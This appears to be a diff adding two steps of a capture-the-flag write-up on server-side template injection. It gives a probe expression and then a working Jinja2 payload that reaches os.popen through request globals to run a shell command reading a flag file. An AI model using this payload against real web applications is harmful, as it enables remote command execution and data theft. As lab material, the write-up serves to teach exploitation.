@@ -1,0 +1,2 @@
+1. Test the input value for SSTI and notice the expression being evaluated `{{4*4}}[[5*5]]`
+2. Send a SSTI payload to read the flag value `# {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /home/flag.txt')['read']() }}`
